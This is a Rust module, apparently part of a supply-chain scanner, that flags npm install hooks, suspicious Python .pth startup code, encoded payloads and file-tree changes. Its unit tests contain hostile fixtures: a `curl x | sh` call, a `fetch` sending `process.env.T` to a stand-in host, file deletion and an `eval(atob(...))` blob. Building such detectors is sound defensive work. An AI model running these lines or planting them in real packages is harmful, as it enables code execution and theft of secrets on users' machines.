//! Looking at an installed-but-not-yet-run tree: which packages want to run
//! code at install time, what that code looks like, and what the tree
//! contains before and after it runs.

use crate::modules::watch_install::script_signals;
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

/// Lifecycle hooks npm runs on install, in order.
pub const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall"];
/// An unbroken run of base64 / hex characters at least this long is an
/// embedded encoded payload; code, even minified, breaks runs with punctuation.
const BLOB_MIN: usize = 120;
/// Helper files larger than this are not read.
const MAX_HELPER_BYTES: u64 = 1024 * 1024;

/// An installed package directory.
#[derive(Debug, Clone)]
pub struct Installed {
    pub dir: PathBuf,
    pub name: String,
    pub version: String,
    pub manifest: serde_json::Value,
}

/// Every package under `node_modules`, nested copies included.
pub fn installed_packages(node_modules: &Path) -> Vec<Installed> {
    let mut out = Vec::new();
    walk_node_modules(node_modules, &mut out);
    out
}

fn walk_node_modules(dir: &Path, out: &mut Vec<Installed>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    let mut dirs: Vec<PathBuf> = entries
        .flatten()
        .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
        .map(|e| e.path())
        .collect();
    dirs.sort();
    for d in dirs {
        let name = d
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default();
        if name.starts_with('.') {
            continue; // .bin, .cache, .package-lock.json's siblings
        }
        if name.starts_with('@') {
            walk_node_modules(&d, out);
            continue;
        }
        if let Some(pkg) = read_package(&d) {
            out.push(pkg);
        }
        walk_node_modules(&d.join("node_modules"), out);
    }
}

pub(super) fn read_package(dir: &Path) -> Option<Installed> {
    let manifest: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(dir.join("package.json")).ok()?).ok()?;
    Some(Installed {
        dir: dir.to_path_buf(),
        name: manifest.get("name")?.as_str()?.to_string(),
        version: manifest
            .get("version")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        manifest,
    })
}

/// A package that runs code at install time, and what that code looks like.
#[derive(Debug, Clone)]
pub struct ScriptPackage {
    pub pkg: Installed,
    /// (hook, command) as npm will run them.
    pub hooks: Vec<(String, String)>,
    /// Suspicious patterns found in the commands and the files they run.
    pub signals: Vec<String>,
    /// Length of the longest encoded-looking blob, if any.
    pub blob: Option<usize>,
    /// Helper files the commands run, relative to the package.
    pub helpers: Vec<String>,
}

impl ScriptPackage {
    pub fn suspicious(&self) -> bool {
        !self.signals.is_empty() || self.blob.is_some()
    }

    pub fn evidence(&self) -> String {
        let mut parts: Vec<String> = Vec::new();
        if !self.signals.is_empty() {
            parts.push(self.signals.join(", "));
        }
        if let Some(len) = self.blob {
            parts.push(format!(
                "a {len}-character encoded blob (likely obfuscated)"
            ));
        }
        let hooks: Vec<String> = self
            .hooks
            .iter()
            .map(|(h, c)| format!("{h}: `{c}`"))
            .collect();
        let mut s = hooks.join("; ");
        if !parts.is_empty() {
            s.push_str(&format!(" — {}", parts.join("; ")));
        }
        if !self.helpers.is_empty() {
            s.push_str(&format!(" (incl. {})", self.helpers.join(", ")));
        }
        s
    }
}

/// Files a shell command runs from the package: `node install.js`,
/// `sh ./scripts/build.sh`, `./setup`, …
fn helper_files(command: &str) -> Vec<String> {
    command
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')'))
        .map(|t| t.trim_matches(|c| c == '"' || c == '\''))
        .filter(|t| {
            !t.is_empty()
                && !t.starts_with('-')
                && (t.starts_with("./")
                    || [".js", ".cjs", ".mjs", ".sh", ".py"]
                        .iter()
                        .any(|e| t.ends_with(e)))
        })
        .map(str::to_string)
        .collect()
}

/// Read `rel` from inside `dir` only — a script path cannot reach out.
fn read_inside(dir: &Path, rel: &str) -> Option<String> {
    let base = dir.canonicalize().ok()?;
    let path = base.join(rel).canonicalize().ok()?;
    if !path.starts_with(&base) || std::fs::metadata(&path).ok()?.len() > MAX_HELPER_BYTES {
        return None;
    }
    std::fs::read_to_string(path).ok()
}

/// Packages that will run code on install: lifecycle hooks, or a
/// `binding.gyp` with no `install` hook (npm then runs `node-gyp rebuild`).
pub fn script_packages(installed: &[Installed]) -> Vec<ScriptPackage> {
    let mut out = Vec::new();
    for pkg in installed {
        let scripts = pkg.manifest.get("scripts").and_then(|s| s.as_object());
        let mut hooks: Vec<(String, String)> = INSTALL_HOOKS
            .iter()
            .filter_map(|h| {
                let cmd = scripts?.get(*h)?.as_str()?;
                Some((h.to_string(), cmd.to_string()))
            })
            .collect();
        let gyp = pkg.dir.join("binding.gyp").is_file();
        if gyp
            && !hooks
                .iter()
                .any(|(h, _)| h == "install" || h == "preinstall")
        {
            hooks.push(("install".into(), "node-gyp rebuild".into()));
        }
        if hooks.is_empty() {
            continue;
        }
        let mut text = String::new();
        let mut helpers = Vec::new();
        for (_, cmd) in &hooks {
            text.push_str(cmd);
            text.push('\n');
            for h in helper_files(cmd) {
                if let Some(body) = read_inside(&pkg.dir, &h) {
                    text.push_str(&body);
                    text.push('\n');
                    helpers.push(h);
                }
            }
        }
        let mut signals = script_signals(&text);
        // A dependency's install code has no business outside its own
        // directory; `../` is how it would get there.
        if text.contains("../") || text.contains("..\\") {
            signals.push("reaches outside its package (../)".into());
        }
        out.push(ScriptPackage {
            pkg: pkg.clone(),
            hooks,
            signals,
            blob: encoded_blob(&text),
            helpers,
        });
    }
    out
}

/// Statements of well-known benign `.pth` lines, whitespace removed and
/// each package-name string as `N` (see [`pth_statement_shape`]):
/// setuptools' distutils shim, virtualenv's bootstrap and the namespace
/// package stubs setuptools has written over the years. Editable-install
/// finders are matched in [`benign_pth_statement`].
const BENIGN_PTH: &[&str] = &[
    "",
    "importos",
    "importsys,types,os",
    "import_virtualenv",
    "var='SETUPTOOLS_USE_DISTUTILS'",
    "enabled=os.environ.get(var,'local')=='local'",
    "enabled=os.environ.get(var,'stdlib')=='local'",
    "enabledand__import__('_distutils_hack').add_shim()",
    "has_mfs=sys.version_info>(3,5)",
    "p=os.path.join(sys._getframe(1).f_locals['sitedir'],*(N))",
    "ie=os.path.exists(os.path.join(p,'__init__.py'))",
    "importlib=has_mfsand__import__('importlib.util')",
    "importlib=__import__('importlib.util')",
    "has_mfsand__import__('importlib.machinery')",
    "__import__('importlib.machinery')",
    "m=has_mfsandsys.modules.setdefault(N,importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec(N,[os.path.dirname(p)])))",
    "m=sys.modules.setdefault(N,importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec(N,[os.path.dirname(p)])))",
    "m=morsys.modules.setdefault(N,types.ModuleType(N))",
    "m=notieandsys.modules.setdefault(N,types.ModuleType(N))",
    "mp=(mor[])andm.__dict__.setdefault('__path__',[])",
    "(pnotinmp)andmp.append(p)",
    "mandsetattr(sys.modules[N],N,m)",
];

/// String literals the [`BENIGN_PTH`] shapes spell out; any other
/// dotted-name literal is a package name.
const PTH_FIXED_LITERALS: &[&str] = &[
    "SETUPTOOLS_USE_DISTUTILS",
    "local",
    "stdlib",
    "_distutils_hack",
    "sitedir",
    "__init__.py",
    "importlib.util",
    "importlib.machinery",
    "__path__",
];

/// The statements of one `.pth` line: split at `;` outside string literals.
fn pth_statements(line: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let (mut start, mut quote, mut escaped) = (0, None, false);
    for (i, c) in line.char_indices() {
        match quote {
            Some(_) if escaped => escaped = false,
            Some(_) if c == '\\' => escaped = true,
            Some(q) if c == q => quote = None,
            Some(_) => {}
            None if c == '\'' || c == '"' => quote = Some(c),
            None if c == ';' => {
                out.push(&line[start..i]);
                start = i + 1;
            }
            None => {}
        }
    }
    out.push(&line[start..]);
    out
}

/// `stmt` with whitespace outside string literals removed, literals in
/// single quotes, and each package-name literal (a dotted name not in
/// [`PTH_FIXED_LITERALS`]) as `N`; a tuple of names becomes `(N)`.
fn pth_statement_shape(stmt: &str) -> String {
    let mut out = String::new();
    let mut chars = stmt.chars();
    while let Some(c) = chars.next() {
        if c != '\'' && c != '"' {
            if !c.is_whitespace() {
                out.push(c);
            }
            continue;
        }
        let mut lit = String::new();
        let mut closed = false;
        for d in chars.by_ref() {
            if d == c {
                closed = true;
                break;
            }
            lit.push(d);
        }
        let name = !lit.is_empty()
            && lit
                .chars()
                .all(|d| d.is_ascii_alphanumeric() || d == '_' || d == '.')
            && !PTH_FIXED_LITERALS.contains(&lit.as_str());
        if !closed || (!name && lit.contains(['\\', '\''])) {
            // Not a literal these shapes know: keep it so nothing matches.
            out.push(c);
            out.push_str(&lit);
        } else if name {
            out.push('N');
        } else {
            out.push('\'');
            out.push_str(&lit);
            out.push('\'');
        }
    }
    while out.contains("N,N") {
        out = out.replace("N,N", "N");
    }
    out.replace("(N,)", "(N)")
}

/// Whether `stmt` is one of the known benign `.pth` statements.
fn benign_pth_statement(stmt: &str) -> bool {
    let shape = pth_statement_shape(stmt);
    let ident =
        |s: &str| !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
    // setuptools' editable finders: `import __editable___<pkg>_finder;
    // __editable___<pkg>_finder.install()`.
    let editable = shape
        .strip_prefix("import__editable___")
        .or_else(|| {
            shape
                .strip_prefix("__editable___")
                .and_then(|s| s.strip_suffix(".install()"))
        })
        .is_some_and(ident);
    editable || BENIGN_PTH.contains(&shape.as_str())
}

/// Why one line of startup code looks malicious: the usual Python signals,
/// plus writing or deleting files — nothing legitimate does that at
/// interpreter start — and encoded payloads.
fn startup_line_signals(l: &str) -> Vec<String> {
    let mut out = crate::modules::pip_audit::scan_python_signals(l);
    let writes = l.contains(".write(")
        || ["'w'", "\"w\"", "'a'", "\"a\"", "'wb'", "\"wb\""]
            .iter()
            .any(|m| l.contains("open(") && l.contains(m))
        || [
            "os.remove(",
            "os.unlink(",
            "shutil.",
            "os.rename(",
            "os.chmod(",
        ]
        .iter()
        .any(|m| l.contains(m));
    if writes {
        out.push("writes files at Python start".into());
    }
    if encoded_blob(l).is_some() {
        out.push("encoded payload".into());
    }
    out
}

/// The modules Python code imports, by full name: `import a.b, c`,
/// `from a.b import c` (`a.b`, and `a.b.c` in case `c` is a submodule),
/// `__import__('a.b')`, `importlib.import_module('a.b')` — read from the
/// syntax tree, so parenthesised and continued imports spanning lines and
/// imports inside functions count. Relative imports (`from .x import y`)
/// resolve against `package`, the package the code belongs to; without one
/// they are skipped.
fn imported_modules(code: &str, package: Option<&str>) -> Vec<String> {
    let mut parser = tree_sitter::Parser::new();
    let language: tree_sitter::Language = tree_sitter_python::LANGUAGE.into();
    if parser.set_language(&language).is_err() {
        return Vec::new();
    }
    let Some(tree) = parser.parse(code, None) else {
        return Vec::new();
    };
    let src = code.as_bytes();
    // Node text without whitespace (`a . b` is `a.b`).
    let text = |n: tree_sitter::Node<'_>| -> String {
        n.utf8_text(src)
            .unwrap_or("")
            .chars()
            .filter(|c| !c.is_whitespace())
            .collect()
    };
    // The module named by an `import` list entry (`a.b`, `a.b as c`).
    let entry = |n: tree_sitter::Node<'_>| match n.kind() {
        "dotted_name" => Some(text(n)),
        "aliased_import" => n.child_by_field_name("name").map(text),
        _ => None,
    };
    // `from` targets: `..x` is `x` in the parent of `package`.
    let absolute = |target: &str| -> Option<String> {
        let rest = target.trim_start_matches('.');
        let dots = target.len() - rest.len();
        if dots == 0 {
            return Some(rest.to_string());
        }
        let mut base: Vec<&str> = package?.split('.').collect();
        for _ in 1..dots {
            base.pop()?;
        }
        if !rest.is_empty() {
            base.push(rest);
        }
        (!base.is_empty()).then(|| base.join("."))
    };
    let mut out: Vec<String> = Vec::new();
    let mut stack = vec![tree.root_node()];
    while let Some(node) = stack.pop() {
        match node.kind() {
            "import_statement" => {
                let mut cursor = node.walk();
                out.extend(
                    node.children_by_field_name("name", &mut cursor)
                        .filter_map(entry),
                );
            }
            "import_from_statement" => {
                if let Some(module) = node
                    .child_by_field_name("module_name")
                    .and_then(|m| absolute(&text(m)))
                {
                    let mut cursor = node.walk();
                    for name in node
                        .children_by_field_name("name", &mut cursor)
                        .filter_map(entry)
                    {
                        out.push(format!("{module}.{name}"));
                    }
                    out.push(module);
                }
            }
            "call" => {
                let function = node.child_by_field_name("function").map(text);
                let first = node
                    .child_by_field_name("arguments")
                    .and_then(|a| a.named_child(0))
                    .filter(|a| a.kind() == "string");
                if let (Some(f), Some(arg)) = (function, first)
                    && (f.ends_with("__import__") || f.ends_with("import_module"))
                {
                    let mut cursor = arg.walk();
                    let content: Vec<String> = arg
                        .named_children(&mut cursor)
                        .filter(|c| c.kind() == "string_content")
                        .map(text)
                        .collect();
                    out.push(content.concat());
                }
            }
            _ => {}
        }
        let mut cursor = node.walk();
        stack.extend(node.children(&mut cursor));
    }
    let valid = |name: &str| {
        name.split('.').all(|part| {
            !part.is_empty()
                && !part.starts_with(|c: char| c.is_ascii_digit())
                && part.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        })
    };
    out.retain(|n| valid(n));
    out.sort();
    out.dedup();
    out
}

/// Why the executable lines of a `.pth` file look malicious; empty when
/// they do not. `.pth` lines run at every Python start
/// ([`startup_line_signals`]). Statements of well-known benign lines are
/// set aside first ([`BENIGN_PTH`]), since several use `__import__` or
/// `os.environ`; everything else on the line, including anything appended
/// to a benign statement, is inspected.
///
/// A line that imports a module runs that module too — and, for `a.b.c`,
/// `a` and `a.b` first — so every module the lines import, benign ones
/// included, and what those import in turn, is inspected the same way
/// when `module` finds it (the wheel or the environment ships it; `None`
/// for the standard library and the like). `module` gives its source and
/// whether it is a package (`__init__.py`).
pub fn pth_signals(code: &str, module: &dyn Fn(&str) -> Option<(String, bool)>) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for line in code.lines() {
        let rest: Vec<&str> = pth_statements(line.trim())
            .into_iter()
            .filter(|s| !benign_pth_statement(s))
            .collect();
        if !rest.is_empty() {
            out.extend(startup_line_signals(&rest.join(";")));
        }
    }
    // Each name with its parent packages, which Python imports first.
    let with_parents = |names: Vec<String>| -> Vec<String> {
        names
            .iter()
            .flat_map(|n| {
                n.match_indices('.')
                    .map(|(i, _)| n[..i].to_string())
                    .chain([n.clone()])
                    .collect::<Vec<_>>()
            })
            .collect()
    };
    let mut queue = with_parents(imported_modules(code, None));
    let mut seen: HashSet<String> = HashSet::new();
    while let Some(name) = queue.pop() {
        // A bound on helper chains; legitimate ones are a module or two.
        if seen.len() >= 64 || !seen.insert(name.clone()) {
            continue;
        }
        let Some((source, is_package)) = module(&name) else {
            continue;
        };
        for line in source.lines() {
            out.extend(
                startup_line_signals(line)
                    .into_iter()
                    .map(|s| format!("{s} (in module {name})")),
            );
        }
        let package = if is_package {
            Some(name.as_str())
        } else {
            name.rsplit_once('.').map(|(p, _)| p)
        };
        queue.extend(with_parents(imported_modules(&source, package)));
    }
    out.sort();
    out.dedup();
    out
}

/// Module `name` (dotted) in a directory of installed or packed modules:
/// `a/b.py`, else the package `a/b/__init__.py`, read through `read`; with
/// whether it is a package.
pub fn module_source(name: &str, read: impl Fn(&str) -> Option<String>) -> Option<(String, bool)> {
    let path = name.replace('.', "/");
    read(&format!("{path}.py"))
        .map(|s| (s, false))
        .or_else(|| read(&format!("{path}/__init__.py")).map(|s| (s, true)))
}

/// The length of the longest run of base64/hex characters that mixes
/// letters and digits and is at least [`BLOB_MIN`] long.
pub fn encoded_blob(text: &str) -> Option<usize> {
    let mut best: Option<usize> = None;
    let mut consider = |run: &str| {
        let (mut digit, mut alpha) = (false, false);
        for c in run.chars() {
            digit |= c.is_ascii_digit();
            alpha |= c.is_ascii_alphabetic();
        }
        // An absolute path (an editable finder's mapping, a Nix store path)
        // is not a payload: its segments are short, while `/` is one
        // base64 character in 64.
        let segments: Vec<&str> = run.split('/').filter(|s| !s.is_empty()).collect();
        let path =
            run.starts_with('/') && segments.len() >= 3 && segments.iter().all(|s| s.len() < 64);
        if run.len() >= BLOB_MIN && digit && alpha && !path {
            best = Some(best.map_or(run.len(), |b| b.max(run.len())));
        }
    };
    let mut start = None;
    for (i, c) in text.char_indices() {
        let in_alphabet = c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=' | '-' | '_');
        match (in_alphabet, start) {
            (true, None) => start = Some(i),
            (false, Some(s)) => {
                consider(&text[s..i]);
                start = None;
            }
            _ => {}
        }
    }
    if let Some(s) = start {
        consider(&text[s..]);
    }
    best
}

// ── Snapshots ─────────────────────────────────────────────────────────────────

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Stat {
    pub size: u64,
    pub mtime_ns: i128,
    pub executable: bool,
}

pub type Snapshot = HashMap<PathBuf, Stat>;

/// Every file under `root`, skipping directories named in `skip` (e.g.
/// `.git`). Size, modification time and the executable bit are enough to
/// see a write; hashing every file of a large tree would not pay off.
pub fn snapshot(root: &Path, skip: &[&str]) -> Snapshot {
    let mut out = HashMap::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(dir) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for e in entries.flatten() {
            let path = e.path();
            let Ok(meta) = e.metadata() else { continue };
            if meta.is_dir() {
                let name = e.file_name();
                if !skip.iter().any(|s| name == *s) {
                    stack.push(path);
                }
            } else if meta.is_file() {
                out.insert(path, stat(&meta));
            }
        }
    }
    out
}

fn stat(meta: &std::fs::Metadata) -> Stat {
    let mtime_ns = meta
        .modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map_or(0, |d| d.as_nanos() as i128);
    #[cfg(unix)]
    let executable = {
        use std::os::unix::fs::PermissionsExt;
        meta.permissions().mode() & 0o111 != 0
    };
    #[cfg(not(unix))]
    let executable = false;
    Stat {
        size: meta.len(),
        mtime_ns,
        executable,
    }
}

#[derive(Debug, Default)]
pub struct Changes {
    pub created: Vec<PathBuf>,
    pub modified: Vec<PathBuf>,
    pub deleted: Vec<PathBuf>,
}

pub fn changes(before: &Snapshot, after: &Snapshot) -> Changes {
    let mut c = Changes::default();
    for (p, s) in after {
        match before.get(p) {
            None => c.created.push(p.clone()),
            Some(b) if b != s => c.modified.push(p.clone()),
            _ => {}
        }
    }
    c.deleted = before
        .keys()
        .filter(|p| !after.contains_key(*p))
        .cloned()
        .collect();
    c.created.sort();
    c.modified.sort();
    c.deleted.sort();
    c
}

// ── Transient files (unisolated runs) ─────────────────────────────────────────

/// Watches a tree while a script runs, to catch files created and deleted
/// before an after-snapshot could see them (the dropper pattern).
pub struct Watch {
    _watcher: notify::RecommendedWatcher,
    created: std::sync::mpsc::Receiver<notify::Result<notify::Event>>,
}

impl Watch {
    /// `None` if the platform watcher could not be started (e.g. inotify
    /// limits) — the caller reports monitoring as incomplete.
    pub fn start(roots: &[&Path]) -> Option<Watch> {
        use notify::Watcher;
        let (tx, rx) = std::sync::mpsc::channel();
        let mut w = notify::recommended_watcher(tx).ok()?;
        for r in roots {
            w.watch(r, notify::RecursiveMode::Recursive).ok()?;
        }
        Some(Watch {
            _watcher: w,
            created: rx,
        })
    }

    /// Files created during the watch that no longer exist. `Err` when the
    /// event queue overflowed, so the answer is not complete.
    pub fn vanished(self) -> Result<Vec<PathBuf>, String> {
        let mut seen: Vec<PathBuf> = Vec::new();
        for ev in self.created.try_iter() {
            let ev = ev.map_err(|e| e.to_string())?;
            if ev.need_rescan() {
                return Err("filesystem event queue overflowed".into());
            }
            if matches!(ev.kind, notify::EventKind::Create(_)) {
                seen.extend(ev.paths);
            }
        }
        seen.sort();
        seen.dedup();
        Ok(seen.into_iter().filter(|p| !p.exists()).collect())
    }
}

#[cfg(test)]
mod tests {

    #[test]
    fn pth_startup_code() {
        // Benign shapes from real wheels.
        for benign in [
            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); ",
            "import __editable___mypkg_1_0_finder; __editable___mypkg_1_0_finder.install()",
            "import _virtualenv",
            "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));importlib = has_mfs and __import__('importlib.util')",
            // setuptools' current namespace stub, for a nested namespace.
            "import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google', 'cloud'));importlib = __import__('importlib.util');__import__('importlib.machinery');m = sys.modules.setdefault('google.cloud', importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('google.cloud', [os.path.dirname(p)])));m = m or sys.modules.setdefault('google.cloud', types.ModuleType('google.cloud'));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p);m and setattr(sys.modules['google'], 'cloud', m)",
            // The oldest one.
            "import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('zope',));ie = os.path.exists(os.path.join(p,'__init__.py'));m = not ie and sys.modules.setdefault('zope', types.ModuleType('zope'));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)",
        ] {
            assert!(pth_signals(benign, &|_| None).is_empty(), "{benign}");
        }
        for bad in [
            "import os; open(os.path.expanduser('~/x'), 'w').write('x')",
            "import os; os.system('curl x | sh')",
            "import urllib.request; urllib.request.urlopen('http://x')",
            "import shutil; shutil.rmtree('/tmp/x')",
            // Code appended to a benign statement is still inspected.
            "import __editable___mypkg_1_0_finder; __editable___mypkg_1_0_finder.install(); open('/tmp/canary', 'w').write('x')",
            "import _virtualenv; import os; os.system('id')",
            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); __import__('os').system('id')",
            "import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('g',));os.remove(p)",
            // A `;` inside a string does not hide what follows it.
            "import _virtualenv; x = ';'; import subprocess; subprocess.run('id')",
        ] {
            assert!(!pth_signals(bad, &|_| None).is_empty(), "{bad}");
        }
    }

    #[test]
    fn modules_a_pth_imports_are_inspected() {
        let finder = "import __editable___fx_finder; __editable___fx_finder.install()";
        // setuptools' real finder: imports and path hooks, nothing else.
        let real = "import sys\nfrom importlib.machinery import ModuleSpec, PathFinder\n\
                    MAPPING = {'fx': '/src/fx'}\ndef install():\n    sys.meta_path.append(None)\n";
        let shipped = |src: &'static str| {
            move |m: &str| (m == "__editable___fx_finder").then(|| (src.to_string(), false))
        };
        assert!(pth_signals(finder, &shipped(real)).is_empty());
        let evil = "def install():\n    open('/tmp/canary', 'w').write('x')\n";
        let found = pth_signals(finder, &shipped(evil));
        assert_eq!(
            found,
            ["writes files at Python start (in module __editable___fx_finder)"]
        );
        // A helper's own imports are followed too.
        let modules = |m: &str| match m {
            "_virtualenv" => Some(("import _helper2\n".to_string(), false)),
            "_helper2" => Some(("import os; os.system('id')\n".to_string(), false)),
            _ => None,
        };
        assert!(!pth_signals("import _virtualenv", &modules).is_empty());
        assert_eq!(
            imported_modules(
                "import a.b, c as d; from e.f import (g, h as i); __import__('j.k'); importlib.import_module(\"l\")",
                None
            ),
            ["a.b", "c", "e.f", "e.f.g", "e.f.h", "j.k", "l"]
        );
        assert_eq!(
            imported_modules(
                "from . import x; from .y import z; from ..w import v",
                Some("p.q")
            ),
            ["p.q", "p.q.x", "p.q.y", "p.q.y.z", "p.w", "p.w.v"]
        );
        assert!(imported_modules("from . import x", None).is_empty());
        // Statements spanning lines, and imports inside functions.
        assert_eq!(
            imported_modules(
                "from fixture_pkg import (\n    payload,\n    other as o,\n)\nimport a, \\\n    b.c\ndef install():\n    import d\n    __import__(\n        'e.f'\n    )\n",
                None
            ),
            [
                "a",
                "b.c",
                "d",
                "e.f",
                "fixture_pkg",
                "fixture_pkg.other",
                "fixture_pkg.payload"
            ]
        );
        // Mentions in strings and comments are not imports.
        assert!(imported_modules("x = 'import evil'  # import other\n", None).is_empty());
    }

    #[test]
    fn submodules_a_pth_imports_are_inspected() {
        // A wheel's files, as `module_source` reads them.
        let files = |f: &str| match f {
            "fixture_pkg/__init__.py" => Some(String::new()),
            "fixture_pkg/payload.py" => Some("open('/tmp/canary', 'w').write('x')\n".into()),
            "fixture_pkg/rel/__init__.py" => Some("from . import inner\n".into()),
            "fixture_pkg/rel/inner.py" => Some("import os; os.system('id')\n".into()),
            _ => None,
        };
        let module = |m: &str| module_source(m, files);
        // A helper importing the payload in a statement spanning lines.
        let helper = |f: &str| match f {
            "_helper.py" => Some("from fixture_pkg import (\n    payload,\n)\n".into()),
            _ => files(f),
        };
        let helper_module = |m: &str| module_source(m, helper);
        assert!(!pth_signals("import _helper", &helper_module).is_empty());
        for line in [
            "import fixture_pkg.payload",
            "from fixture_pkg import payload",
            "import __editable___fx_finder; __import__('fixture_pkg.payload')",
            "import fixture_pkg.rel",
        ] {
            assert!(!pth_signals(line, &module).is_empty(), "{line}");
        }
        assert!(pth_signals("import fixture_pkg", &module).is_empty());
    }

    #[test]
    fn pth_statements_split_outside_strings() {
        assert_eq!(
            pth_statements("import os; x = 'a;b'; y = \"c;d\""),
            ["import os", " x = 'a;b'", " y = \"c;d\""]
        );
        assert_eq!(
            pth_statement_shape("m and setattr(sys.modules['google'], 'cloud', m)"),
            "mandsetattr(sys.modules[N],N,m)"
        );
        // An editable finder name must be the whole statement.
        assert!(benign_pth_statement("import __editable___a_1_finder"));
        assert!(!benign_pth_statement("import __editable___a_1_finder, os"));
        assert!(!benign_pth_statement(
            "__editable___a.install(os.system('id'))"
        ));
    }

    use super::*;

    #[test]
    fn helper_files_are_taken_from_commands() {
        assert_eq!(helper_files("node install.js"), ["install.js"]);
        assert_eq!(
            helper_files("sh ./scripts/build.sh && node-gyp rebuild"),
            ["./scripts/build.sh"]
        );
        assert_eq!(
            helper_files("node -e \"require('x')\""),
            Vec::<String>::new()
        );
        assert_eq!(helper_files("./setup --fast"), ["./setup"]);
    }

    #[test]
    fn helpers_cannot_be_read_from_outside_the_package() {
        let dir = tempfile::tempdir().unwrap();
        let pkg = dir.path().join("pkg");
        std::fs::create_dir(&pkg).unwrap();
        std::fs::write(dir.path().join("secret.js"), "x").unwrap();
        std::fs::write(pkg.join("ok.js"), "y").unwrap();
        assert_eq!(read_inside(&pkg, "ok.js").as_deref(), Some("y"));
        assert_eq!(read_inside(&pkg, "../secret.js"), None);
    }

    #[test]
    fn walker_finds_nested_and_scoped_packages_and_script_packages() {
        let dir = tempfile::tempdir().unwrap();
        let nm = dir.path().join("node_modules");
        let write = |rel: &str, json: &str| {
            let d = nm.join(rel);
            std::fs::create_dir_all(&d).unwrap();
            std::fs::write(d.join("package.json"), json).unwrap();
        };
        write(
            "a",
            r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"node install.js"}}"#,
        );
        std::fs::write(
            nm.join("a/install.js"),
            "fetch('https://x', {body: process.env.T})",
        )
        .unwrap();
        write("a/node_modules/b", r#"{"name":"b","version":"2.0.0"}"#);
        write("@s/c", r#"{"name":"@s/c","version":"3.0.0"}"#);
        std::fs::write(nm.join("@s/c/binding.gyp"), "{}").unwrap();
        let installed = installed_packages(&nm);
        let mut ids: Vec<String> = installed
            .iter()
            .map(|p| format!("{}@{}", p.name, p.version))
            .collect();
        ids.sort();
        assert_eq!(ids, ["@s/c@3.0.0", "a@1.0.0", "b@2.0.0"]);

        let scripts = script_packages(&installed);
        let a = scripts.iter().find(|s| s.pkg.name == "a").unwrap();
        assert!(a.suspicious(), "helper file content is inspected");
        assert_eq!(a.helpers, ["install.js"]);
        let c = scripts.iter().find(|s| s.pkg.name == "@s/c").unwrap();
        assert_eq!(
            c.hooks,
            [("install".to_string(), "node-gyp rebuild".to_string())]
        );
        assert!(!c.suspicious());
    }

    #[test]
    fn encoded_blobs_but_not_code() {
        let blob = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IHBheWxvYWQgdGhhdCBjYXJyaWVzIGEgaGlkZGVuIHNjcmlwdCB0byBydW4gb24gaW5zdGFsbA==";
        assert_eq!(
            encoded_blob(&format!("eval(atob('{blob}'))")),
            Some(blob.len())
        );
        let code = "const result = await fetchBinary(platform, arch); if (!result.ok) { throw new Error(`failed ${result.status}`) }";
        assert_eq!(encoded_blob(&code.repeat(20)), None);
        // A long sha512 integrity string in a lockfile-like line is a blob,
        // but a long word list without digits is not.
        assert_eq!(encoded_blob(&"abcdefghij".repeat(20)), None);
        // Absolute paths with hashed or long segments are not payloads, but
        // a blob that merely starts with `/` still is.
        for path in [
            "MAPPING = {'pkg': '/tmp/claude-1000/-home-user-Documents-OpenSource/e9b9eba7-50a5-4c42-8c4d-2dce96c24478/scratchpad/helpers/pkg2/code'}",
            "'/nix/store/0c2kzhmw1p1q7nrbnkv1q0j8ri1d7b8s-python3.12-setuptools-69.0.3/lib/python3.12/site-packages'",
        ] {
            assert_eq!(encoded_blob(path), None, "{path}");
        }
        assert!(encoded_blob(&format!("'/{blob}'")).is_some());
    }

    #[test]
    fn snapshot_changes() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("keep"), "1").unwrap();
        std::fs::write(dir.path().join("gone"), "1").unwrap();
        let before = snapshot(dir.path(), &[]);
        std::fs::remove_file(dir.path().join("gone")).unwrap();
        std::fs::write(dir.path().join("new"), "1").unwrap();
        std::fs::write(dir.path().join("keep"), "22").unwrap();
        let c = changes(&before, &snapshot(dir.path(), &[]));
        assert_eq!(c.created, [dir.path().join("new")]);
        assert_eq!(c.modified, [dir.path().join("keep")]);
        assert_eq!(c.deleted, [dir.path().join("gone")]);
    }
}
